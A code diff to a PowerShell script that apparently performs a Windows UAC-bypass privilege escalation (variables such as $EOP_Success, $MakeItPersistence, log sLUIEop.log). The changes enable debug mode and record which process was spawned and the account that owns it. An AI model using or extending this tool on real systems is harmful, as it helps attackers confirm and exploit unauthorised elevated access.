@@ -57,7 +57,7 @@
 
 
 $Command = $Null               # Command Internal function [<dontchange>]
-$DebugMode = "False"           # Change this value to "True" to debug cmdlet
+$DebugMode = "True"           # Change this value to "True" to debug cmdlet
 $EOP_Success = $False          # Remote execution Status [<dontchange>]
 $MakeItPersistence = "False"   # Change this value to "True" to persiste $Command
 $param1 = $args[0]             # User Inputs [ <arguments> ] [<dontchange>]
@@ -158,6 +158,7 @@ If($CheckVuln -eq $True){
       ## String: "C:\Windows\System32\cmd.exe /c start notepad.exe"
       $ProcessName = $Command -Split(' ')|Select -Last 1 -EA SilentlyContinue
       If($ProcessName -match '[.exe]$'){
+         $ProcessToken = "$ProcessName"
          $ReturnCode = "0";$ProcessName = $ProcessName -replace '.exe',''
          $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
          If($EOPID -match '^\d+$'){$EOP_Success = $True}
@@ -169,6 +170,7 @@ If($CheckVuln -eq $True){
       ## String: "$Env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe"
       $ProcessName = Split-Path "$Command" -Leaf
       If($ProcessName -match '[.exe]$'){
+         $ProcessToken = "$ProcessName"
          $ReturnCode = "1";$ProcessName = $ProcessName -replace '.exe',''
          $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
          If($EOPID -match '^\d+$'){$EOP_Success = $True}
@@ -182,16 +184,19 @@ If($CheckVuln -eq $True){
       $ProcessName = $Command -Split('\\')|Select -Last 1 -EA SilentlyContinue
       ## Extract powershell.exe interpreter process PID
       If($Command -match '^[powershell].*[.ps1]$'){
+         $ProcessToken = "powershell.exe"
          $ReturnCode = "2.0";$EOPID = Get-Process powershell -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
          If($EOPID -match '^\d+$'){$EOP_Success = $True}
       }
       ## Extract cmd.exe interpreter process PID
       ElseIf($Command -match '^[cmd].*[.bat]$'){
+         $ProcessToken = "cmd.exe"
          $ReturnCode = "2.1";$EOPID = Get-Process cmd -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
          If($EOPID -match '^\d+$'){$EOP_Success = $True} 
       }
       ## Extract python.exe interpreter process PID
       ElseIf($Command -match '^[python].*[.py]$'){
+         $ProcessToken = "python.exe"
          $ReturnCode = "2.2";$EOPID = Get-Process python -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
          If($EOPID -match '^\d+$'){$EOP_Success = $True} 
       }
@@ -203,6 +208,7 @@ If($CheckVuln -eq $True){
       ## String: "powershell.exe"
       $ProcessName = Split-Path "$Command" -Leaf
       If($ProcessName -match '[.exe]$'){
+         $ProcessToken = "$ProcessName"
          $ReturnCode = "3";$ProcessName = $ProcessName -replace '.exe',''
          $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
          If($EOPID -match '^\d+$'){$EOP_Success = $True}
@@ -217,6 +223,7 @@ If($CheckVuln -eq $True){
       $RemoteOS = (Get-WmiObject Win32_OperatingSystem).Caption
       $SpawnPath = (Get-Process $ProcessName -EA SilentlyContinue|select *).Path|Select -Last 1
       $SpawnTime = (Get-Process $ProcessName -EA SilentlyContinue|select *).StartTime|Select -Last 1
+      $GroupToken = Get-WmiObject Win32_Process -Filter "name='$ProcessToken'"|Select Name, @{Name="UserName";Expression={$_.GetOwner().Domain+"\"+$_.GetOwner().User}}|Select -Last 1|Select-Object -ExpandProperty UserName
       $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "Id" -Value "$ReturnCode"
     }
     If($EOP_Success -eq $True){$EOPState = "success"}Else{$EOPState = "error ?";$EOPID = "null"}
@@ -229,6 +236,7 @@ If($CheckVuln -eq $True){
     If($DebugMode -eq "True"){$MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "RemoteHost" -Value "$RemoteOS"}
     If($DebugMode -eq "True"){$MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "ProcessPath" -Value "$SpawnPath"}
     If($DebugMode -eq "True"){$MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "EOPCommand" -Value "$Command"}
+    If($DebugMode -eq "True"){$MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "Owner" -Value "$GroupToken"}
     echo $MYPSObjectTable > $Env:TMP\sLUIEop.log
 
 }Else{
